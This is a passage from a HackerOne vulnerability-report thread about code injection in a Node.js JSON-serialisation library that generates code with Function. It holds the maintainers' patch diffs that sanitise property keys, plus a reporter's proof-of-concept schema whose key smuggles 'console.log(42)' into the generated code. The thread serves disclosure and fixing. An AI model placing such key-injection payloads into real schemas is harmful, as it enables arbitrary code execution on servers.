class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003enullable\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n       \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"s2\"\u003e`\n-        if (obj[\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;] === null) {\n+        if (obj[\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;] === null) {\n           \u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddComma\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n-          json += \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003e$asString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"s2\"\u003e:null\u0026#39;\n+          json += \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003e$asString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"s2\"\u003e:null\u0026#39;\n           var rendered = true\n         } else {\n       `\u003c/span\u003e\n\u003cspan class=\"p\"\u003e@@\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e515\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e10\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"mi\"\u003e522\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e10\u003c/span\u003e \u003cspan class=\"p\"\u003e@@\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003ebuildCode\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eschema\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003elaterCode\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eexternalSchema\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003efullSchema\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\n     \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003etype\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003enumber\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n       \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"s2\"\u003e`\n-          var t = Number(obj[\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;])\n+          var t = Number(obj[\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;])\n           if (!isNaN(t)) {\n             \u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddComma\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n-            json += \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003e$asString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"s2\"\u003e:\u0026#39; + t\n+            json += \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003e$asString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"s2\"\u003e:\u0026#39; + t\n       `\u003c/span\u003e\n     \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003etype\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003einteger\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n       \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"s2\"\u003e`\n@@ -526,25 +533,25 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       `\u003c/span\u003e\n       \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eisLong\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n         \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"s2\"\u003e`\n-            if (isLong(obj[\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;])) {\n+            if (isLong(obj[\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;])) {\n               \u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddComma\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n-              json += \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003e$asString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"s2\"\u003e:\u0026#39; + obj[\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;].toString()\n+              json += \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003e$asString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"s2\"\u003e:\u0026#39; + obj[\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;].toString()\n               rendered = true\n             } else {\n-              var t = Number(obj[\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;])\n+              var t = Number(obj[\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;])\n               if (!isNaN(t)) {\n                 \u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddComma\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n-                json += \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003e$asString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"s2\"\u003e:\u0026#39; + t\n+                json += \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003e$asString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"s2\"\u003e:\u0026#39; + t\n                 rendered = true\n               }\n             }\n         `\u003c/span\u003e\n       \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n         \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"s2\"\u003e`\n-            var t = Number(obj[\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;])\n+            var t = Number(obj[\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;])\n             if (!isNaN(t)) {\n               \u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddComma\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n-              json += \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003e$asString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"s2\"\u003e:\u0026#39; + t\n+              json += \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003e$asString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"s2\"\u003e:\u0026#39; + t\n               rendered = true\n             }\n         `\u003c/span\u003e\n\u003cspan class=\"p\"\u003e@@\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e554\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e7\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"mi\"\u003e561\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e7\u003c/span\u003e \u003cspan class=\"p\"\u003e@@\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003ebuildCode\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eschema\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003elaterCode\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eexternalSchema\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003efullSchema\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n       \u003cspan class=\"s2\"\u003e`\n     } else {\n       code += `\u003c/span\u003e\n\u003cspan class=\"o\"\u003e-\u003c/span\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eobj\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e${key}\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e!==\u003c/span\u003e \u003cspan class=\"kc\"\u003eundefined\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003cspan class=\"o\"\u003e+\u003c/span\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eobj\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e${sanitized}\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e!==\u003c/span\u003e \u003cspan class=\"kc\"\u003eundefined\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n           \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddComma\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n           \u003cspan class=\"nx\"\u003ejson\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e${$asString(key)}:\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n         \u003cspan class=\"s2\"\u003e`\n@@ -569,12 +576,12 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       code += `\u003c/span\u003e\n       \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n         \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddComma\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"o\"\u003e-\u003c/span\u003e        \u003cspan class=\"nx\"\u003ejson\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e${$asString(key)}:${JSON.stringify(defaultValue).replace(/\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003eg\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\n+        json += \u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nx\"\u003e$asString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e\u003cspan class=\"p\"\u003e)}:\u003c/span\u003e\u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitizeKey\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estringify\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003edefaultValue\u003c/span\u003e\u003cspan class=\"p\"\u003e)).\u003c/span\u003e\u003cspan class=\"nx\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sr\"\u003e/\u0026#39;/g\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\n       `\n     } else if (schema.required \u0026amp;\u0026amp; schema.required.indexOf(key) !== -1) {\n       code += `\n       } else {\n-        throw new Error(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"nx\"\u003eis\u003c/span\u003e \u003cspan class=\"nx\"\u003erequired\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e)\n+        throw new Error(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"nx\"\u003eis\u003c/span\u003e \u003cspan class=\"nx\"\u003erequired\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e)\n       `\n     }\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-04-12T07:14:49.611Z","updated_at":"2019-04-12T07:14:49.611Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4549261,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"found another one array based.\n\nschema:\n\n```javascript\narr: {\n      type: 'array',\n      items: {\n        type: 'object',\n        properties: {\n          'phra\\' \u0026\u0026 console.log(42)//': {\n            type: 'number'\n          },\n          str: {\n            type: 'string'\n          }\n        }\n      }\n    }\n```\n\nobject to be stringified:\n\n```javascript\narr: [{'phra\\' \u0026\u0026 console.log(42)//': 42}]\n```","markdown_message":"\u003cp\u003efound another one array based.\u003c/p\u003e\n\n\u003cp\u003eschema:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nl\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003earray\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003eitems\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nl\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eobject\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003eproperties\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n          \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ephra\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e \u0026amp;\u0026amp; console.log(42)//\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"nl\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003enumber\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n          \u003cspan class=\"p\"\u003e},\u003c/span\u003e\n          \u003cspan class=\"nx\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"nl\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003estring\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n          \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n      \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eobject to be stringified:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e[{\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ephra\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e \u0026amp;\u0026amp; console.log(42)//\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"mi\"\u003e42\u003c/span\u003e\u003cspan class=\"p\"\u003e}]\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-04-12T16:59:50.836Z","updated_at":"2019-04-12T16:59:50.836Z","actor":{"username":"phra","cleared":false,"url":"/phra","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/201/213/71f68147b3cb0e1d6e7e39953fc2c4822d04d338_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4549299,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"also, it's better to sanitize line _566_ , _855_ and _903_ in the patched `index.js`.\n\nregarding line _875_, i don't understand if it's exploitable (i keep getting syntax errors, but maybe it's possible to workaround that with [jsfuck](http://www.jsfuck.com/) or similar encoding scheme).","markdown_message":"\u003cp\u003ealso, it\u0026#39;s better to sanitize line \u003cu\u003e566\u003c/u\u003e , \u003cu\u003e855\u003c/u\u003e and \u003cu\u003e903\u003c/u\u003e in the patched \u003ccode\u003eindex.js\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eregarding line \u003cu\u003e875\u003c/u\u003e, i don\u0026#39;t understand if it\u0026#39;s exploitable (i keep getting syntax errors, but maybe it\u0026#39;s possible to workaround that with \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.jsfuck.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ejsfuck\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e or similar encoding scheme).\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-12T17:10:05.667Z","updated_at":"2019-04-12T17:24:36.946Z","actor":{"username":"phra","cleared":false,"url":"/phra","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/201/213/71f68147b3cb0e1d6e7e39953fc2c4822d04d338_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4550817,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Please check the following:\n\n```\ndiff --git a/index.js b/index.js\nindex b6bbe4f..a0fbbaa 100644\n--- a/index.js\n+++ b/index.js\n@@ -119,6 +119,7 @@ function build (schema, options) {\n   }\n \n   dependenciesName.push(code)\n+\n   return (Function.apply(null, dependenciesName).apply(null, dependencies))\n }\n \n@@ -301,7 +302,7 @@ function addPatternProperties (schema, externalSchema, fullSchema) {\n     }\n     var type = pp[regex].type\n     code += `\n-        if (/${regex}/.test(keys[i])) {\n+        if (/${regex.replace(/([^\\\\]+\\/)/g, '\\\\/')}/.test(keys[i])) {\n     `\n     if (type === 'object') {\n       code += buildObject(pp[regex], '', 'buildObjectPP' + index, externalSchema, fullSchema)\n@@ -491,6 +492,10 @@ function refFinder (ref, schema, externalSchema) {\n   return (new Function('schema', code))(schema)\n }\n \n+function sanitizeKey (key) {\n+  return key.replace(/([^\\\\])\\'/g, 